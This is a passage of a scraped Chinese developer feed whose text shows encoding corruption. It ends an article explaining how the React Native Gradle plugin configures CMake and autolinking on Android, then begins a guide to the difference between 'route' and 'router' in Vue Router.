â”‚     â””â”€ App çº§åˆ«çš„ Codegen (å¦‚æœå­˜åœ¨)
â”‚
â””â”€ åˆ›å»º libappmodules<span class="hljs-selector-class">.so</span>
</code></pre>
<p>åœ¨React Native çš„åŸç”Ÿé¡¹ç›®ä¸­ï¼Œå¹¶æ²¡æœ‰åšCMakeç›¸å…³çš„é…ç½®ï¼Œé‚£ä¹ˆåˆ°åº•æ˜¯å“ªé‡Œè§¦å‘çš„CMakeæ„å»ºçš„å‘¢ï¼Ÿ</p>
<p>CMake é“¾è·¯å›¾ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ â“ª android/app/build.gradle                                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ apply plugin: <span class="hljs-string">"com.facebook.react"</span>                                   â”‚
â”‚                                                                       â”‚
â”‚ react {                                                              â”‚
â”‚     autolinkLibrariesWithApp()  â† å¯ç”¨ autolinking                   â”‚
â”‚ }                                                                    â”‚
â”‚                                                                       â”‚
â”‚ android {                                                            â”‚
â”‚     ndkVersion rootProject.ext.ndkVersion                           â”‚
â”‚     <span class="hljs-comment">// æ³¨æ„ï¼šå¹¶æ²¡æœ‰ externalNativeBuild é…ç½®ï¼                       â”‚</span>
â”‚ }                                                                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ReactPlugin.kt (apply æ’ä»¶æ—¶æ‰§è¡Œ)                                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ <span class="hljs-keyword">import</span> com.facebook.react.utils.NdkConfiguratorUtils.configureReactNativeNdk|
|                                                                      |
|   <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">apply</span><span class="hljs-params">(project: <span class="hljs-type">Project</span>)</span></span> {                             â”‚
â”‚     configureReactNativeNdk(project, extension)  â† é…ç½® NDK          â”‚
â”‚     configureAutolinking(project, extension)     â† é…ç½® autolinking  â”‚
â”‚   }                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ NdkConfiguratorUtils.kt (è‡ªåŠ¨é…ç½® CMake)                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ <span class="hljs-keyword">val</span> ext = project.extensions.getByType(BaseExtension::<span class="hljs-keyword">class</span>.java)   â”‚
â”‚ ext.buildFeatures.prefab = <span class="hljs-literal">true</span>                                     â”‚
â”‚                                                                       â”‚
â”‚ <span class="hljs-comment">// å…³é”®ä»£ç ï¼šå¦‚æœç”¨æˆ·æ²¡æœ‰æä¾› CMakeLists.txtï¼Œä½¿ç”¨é»˜è®¤çš„           â”‚</span>
â”‚ <span class="hljs-keyword">if</span> (ext.externalNativeBuild.cmake.path == <span class="hljs-literal">null</span>) {                   â”‚
â”‚     ext.externalNativeBuild.cmake.path = File(                      â”‚
â”‚         extension.reactNativeDir.<span class="hljs-keyword">get</span>().asFile,                                        â”‚
â”‚         <span class="hljs-string">"ReactAndroid/cmake-utils/default-app-setup/CMakeLists.txt"</span> â”‚
â”‚     )                                                                â”‚
â”‚ }                                                                    â”‚
â”‚                                                                       â”‚
â”‚ <span class="hljs-comment">// æ·»åŠ  CMake å‚æ•°                                                    â”‚</span>
â”‚ <span class="hljs-keyword">val</span> cmakeArgs = ext.defaultConfig.externalNativeBuild.cmake.argumentsâ”‚
â”‚ cmakeArgs.add(<span class="hljs-string">"-DPROJECT_BUILD_DIR=<span class="hljs-subst">${project.layout.buildDirectory.get().asFile}</span>"</span>)      â”‚
â”‚ cmakeArgs.add(<span class="hljs-string">"-DREACT_ANDROID_DIR=<span class="hljs-subst">${extension.reactNativeDir.file(<span class="hljs-string">"ReactAndroid"</span>).get().asFile}</span>"</span>) â”‚
â”‚ cmakeArgs.add(<span class="hljs-string">"-DANDROID_STL=c++_shared"</span>)                           â”‚
â”‚                                                                       â”‚
â”‚ ç»“æœï¼š                                                                â”‚
â”‚ externalNativeBuild.cmake.path =                                    â”‚
â”‚   <span class="hljs-string">"/path/to/node_modules/react-native/ReactAndroid/cmake-utils/     â”‚
â”‚    default-app-setup/CMakeLists.txt"</span>                                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p>å¯è§ï¼Œæ˜¯<code>com.facebook.react</code>æ’ä»¶è„šæœ¬ä¸­åŠ¨æ€æ³¨å…¥äº†æ„å»ºCMakeçš„é…ç½®ï¼Œä»è€Œè§¦å‘äº†CMakeæ„å»ºã€‚</p>
<h5 data-id="heading-19">æµç¨‹æ€»ç»“</h5>
<ul>
<li><strong>Settings é˜¶æ®µ</strong>ï¼š<code>ReactSettingsPlugin</code> åœ¨ <code>settings.gradle</code> è§£ææ—¶è‡ªåŠ¨æ‰§è¡Œ</li>
<li><strong>é…ç½®é˜¶æ®µ</strong>ï¼š<code>ReactPlugin</code> åœ¨é¡¹ç›®é…ç½®æ—¶æ³¨å†Œ <code>GeneratePackageListTask</code></li>
<li><strong>æ„å»ºé˜¶æ®µ</strong>ï¼š<code>preBuild</code> ä»»åŠ¡è‡ªåŠ¨ä¾èµ– <code>generateAutolinkingPackageList</code> ä»»åŠ¡</li>
<li><strong>ç¼–è¯‘é˜¶æ®µ</strong>ï¼šç”Ÿæˆçš„ <code>PackageList.java</code> è¢«è‡ªåŠ¨ç¼–è¯‘åˆ°åº”ç”¨ä¸­</li>
</ul>
<p>å®Œæ•´çš„ä»»åŠ¡æµç¨‹å›¾</p>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Gradle æ„å»º                                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚ Settings é˜¶æ®µï¼š                                                  â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚ â”‚ ReactSettingsPlugin<span class="hljs-selector-class">.apply</span>()                              â”‚   â”‚
â”‚ â”‚   â†“                                                      â”‚   â”‚
â”‚ â”‚ ReactSettingsExtension<span class="hljs-selector-class">.autolinkLibrariesFromCommand</span>()    â”‚   â”‚
â”‚ â”‚   â†“                                                      â”‚   â”‚
â”‚ â”‚ ç”Ÿæˆ autolinking<span class="hljs-selector-class">.json</span>                                    â”‚   â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                  â†“                              â”‚
â”‚ Configuration é˜¶æ®µï¼š                                             â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚ â”‚ ReactPlugin<span class="hljs-selector-class">.apply</span>()                                      â”‚   â”‚
â”‚ â”‚   â†“                                                      â”‚   â”‚
â”‚ â”‚ <span class="hljs-built_in">configureAutolinking</span>()                                   â”‚   â”‚
â”‚ â”‚   â†“                                                      â”‚   â”‚
â”‚ â”‚ æ³¨å†Œ Autolinking ä»»åŠ¡ï¼š                                   â”‚   â”‚
â”‚ â”‚ - generateAutolinkingPackageList                         â”‚   â”‚
â”‚ â”‚ - generateReactNativeEntryPoint                          â”‚   â”‚
â”‚ â”‚ - generateAutolinkingNewArchitectureFiles                â”‚   â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                  â†“                              â”‚
â”‚ Execution é˜¶æ®µï¼š                                                 â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚ â”‚ preBuild                                                 â”‚   â”‚
â”‚ â”‚   â”œâ”€â”€ generateAutolinkingPackageList                     â”‚   â”‚
â”‚ â”‚   â”‚   â””â”€â”€ ç”Ÿæˆ PackageList<span class="hljs-selector-class">.java</span>                          â”‚   â”‚
â”‚ â”‚   â”œâ”€â”€ generateReactNativeEntryPoint                      â”‚   â”‚
â”‚ â”‚   â”‚   â””â”€â”€ ç”Ÿæˆ ReactNativeApplicationEntryPoint<span class="hljs-selector-class">.java</span>     â”‚   â”‚
â”‚ â”‚   â””â”€â”€ generateAutolinkingNewArchitectureFiles            â”‚   â”‚
â”‚ â”‚       â””â”€â”€ ç”Ÿæˆ C++ æ–°æ¶æ„ä»£ç                              â”‚   â”‚
â”‚ â”‚                                                           â”‚   â”‚
â”‚ â”‚ compileDebugJavaWithJavac                                â”‚   â”‚
â”‚ â”‚   â””â”€â”€ ç¼–è¯‘ç”Ÿæˆçš„ Java ä»£ç                                 â”‚   â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue Router ä¸­ route å’Œ router çš„ç»ˆæåŒºåˆ«æŒ‡å—]]></title>    <link>https://juejin.cn/post/7595351120668540954</link>    <guid>https://juejin.cn/post/7595351120668540954</guid>    <pubDate>2026-01-15T08:43:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595351120668540954" data-draft-id="7595351120668524570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue Router ä¸­ route å’Œ router çš„ç»ˆæåŒºåˆ«æŒ‡å—"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-15T08:43:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue Router ä¸­ route å’Œ router çš„ç»ˆæåŒºåˆ«æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:43:15.000Z" title="Thu Jan 15 2026 08:43:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue Router ä¸­ route å’Œ router çš„ç»ˆæåŒºåˆ«æŒ‡å—</h2>
<blockquote>
<p>åœ¨ Vue Router çš„å¼€å‘ä¸­ï¼Œ<code>route</code> å’Œ <code>router</code> è¿™ä¸¤ä¸ªç›¸ä¼¼çš„åå­—ç»å¸¸è®©å¼€å‘è€…æ··æ·†ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬ç”¨æœ€ç›´è§‚çš„æ–¹å¼å½»åº•ææ‡‚å®ƒä»¬çš„åŒºåˆ«ï¼</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€æœ€ç®€åŒºåˆ†ï¼šä¸€å¥è¯ç†è§£</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸€å¥è¯æ€»ç»“ï¼š</span>
<span class="hljs-comment">// route = å½“å‰çš„è·¯ç”±ä¿¡æ¯ï¼ˆåªè¯»ï¼‰â€”â€” "æˆ‘åœ¨å“ªï¼Ÿ"</span>
<span class="hljs-comment">// router = è·¯ç”±çš„å®ä¾‹å¯¹è±¡ï¼ˆå¯æ“ä½œï¼‰â€”â€” "æˆ‘æ€ä¹ˆå»ï¼Ÿ"</span>

<span class="hljs-comment">// ç±»æ¯”ç†è§£ï¼š</span>
<span class="hljs-comment">// route åƒ GPS å®šä½ä¿¡æ¯ï¼šæ˜¾ç¤ºå½“å‰ä½ç½®ï¼ˆç»çº¬åº¦ã€åœ°å€ç­‰ï¼‰</span>
<span class="hljs-comment">// router åƒå¯¼èˆªç³»ç»Ÿï¼šæä¾›è·¯çº¿è§„åˆ’ã€å¯¼èˆªã€è¿”å›ç­‰åŠŸèƒ½</span>
</code></pre>
<h3 data-id="heading-2">äºŒã€æ ¸å¿ƒåŒºåˆ«å¯¹æ¯”è¡¨</h3>








































<table><thead><tr><th>ç»´åº¦</th><th><strong>route</strong></th><th><strong>router</strong></th></tr></thead><tbody><tr><td><strong>æœ¬è´¨</strong></td><td><strong>å½“å‰è·¯ç”±ä¿¡æ¯å¯¹è±¡</strong>ï¼ˆåªè¯»ï¼‰</td><td><strong>è·¯ç”±å®ä¾‹</strong>ï¼ˆæ“ä½œæ–¹æ³•é›†åˆï¼‰</td></tr><tr><td><strong>ç±»å‹</strong></td><td><code>RouteLocationNormalized</code></td><td><code>Router</code> å®ä¾‹</td></tr><tr><td><strong>åŠŸèƒ½</strong></td><td>è·å–å½“å‰è·¯ç”±ä¿¡æ¯</td><td>è¿›è¡Œè·¯ç”±æ“ä½œï¼ˆè·³è½¬ã€å®ˆå«ç­‰ï¼‰</td></tr><tr><td><strong>æ•°æ®æµå‘</strong></td><td>ä¿¡æ¯è¾“å…¥ï¼ˆè¯»å–ï¼‰</td><td>æŒ‡ä»¤è¾“å‡ºï¼ˆæ‰§è¡Œï¼‰</td></tr><tr><td><strong>ä¿®æ”¹æ€§</strong></td><td>åªè¯»ï¼Œä¸å¯ç›´æ¥ä¿®æ”¹</td><td>å¯æ“ä½œï¼Œå¯ä¿®æ”¹è·¯ç”±çŠ¶æ€</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>è·å–å‚æ•°ã€æŸ¥è¯¢ã€è·¯å¾„ç­‰ä¿¡æ¯</td><td>è·³è½¬ã€ç¼–ç¨‹å¼å¯¼èˆªã€å…¨å±€é…ç½®</td></tr></tbody></table>
<h3 data-id="heading-3">ä¸‰ã€ä»£ç ç›´è§‚å¯¹æ¯”</h3>
<h4 data-id="heading-4">3.1 è·å–æ–¹å¼å¯¹æ¯”</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é€‰é¡¹å¼ API</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-comment">// routeï¼šé€šè¿‡ this.$route è®¿é—®</span>
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$route</span>)     <span class="hljs-comment">// å½“å‰è·¯ç”±ä¿¡æ¯</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>)    <span class="hljs-comment">// è·¯ç”±å®ä¾‹</span>
  }
}

<span class="hljs-comment">// ç»„åˆå¼ API</span>
<span class="hljs-keyword">import</span> { useRoute, useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()    <span class="hljs-comment">// ç›¸å½“äº this.$route</span>
    <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()  <span class="hljs-comment">// ç›¸å½“äº this.$router</span>
    
    <span class="hljs-keyword">return</span> { route, router }
  }
}
</code></pre>
<h4 data-id="heading-5">3.2 æ•°æ®ç»“æ„å¯¹æ¯”</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// route å¯¹è±¡çš„ç»“æ„ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
<span class="hljs-keyword">const</span> route = {
  <span class="hljs-comment">// è·¯å¾„ä¿¡æ¯</span>
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/123/profile?tab=settings'</span>,
  <span class="hljs-attr">fullPath</span>: <span class="hljs-string">'/user/123/profile?tab=settings#section-2'</span>,
  
  <span class="hljs-comment">// è·¯ç”±å‚æ•°ï¼ˆparamsï¼‰</span>
  <span class="hljs-attr">params</span>: {
    <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span>  <span class="hljs-comment">// æ¥è‡ª /user/:id</span>
  },
  
  <span class="hljs-comment">// æŸ¥è¯¢å‚æ•°ï¼ˆqueryï¼‰</span>
  <span class="hljs-attr">query</span>: {
    <span class="hljs-attr">tab</span>: <span class="hljs-string">'settings'</span>  <span class="hljs-comment">// æ¥è‡ª ?tab=settings</span>
  },
  
  <span class="hljs-comment">// å“ˆå¸Œå€¼</span>
  <span class="hljs-attr">hash</span>: <span class="hljs-string">'#section-2'</span>,
  
  <span class="hljs-comment">// è·¯ç”±å…ƒä¿¡æ¯</span>
  <span class="hljs-attr">meta</span>: {
    <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">title</span>: <span class="hljs-string">'ç”¨æˆ·è®¾ç½®'</span>
  },
  
  <span class="hljs-comment">// åŒ¹é…çš„è·¯ç”±è®°å½•</span>
  <span class="hljs-attr">matched</span>: [
    { <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span>, <span class="hljs-attr">meta</span>: { ... } },
    { <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:id'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">UserLayout</span>, <span class="hljs-attr">meta</span>: { ... } },
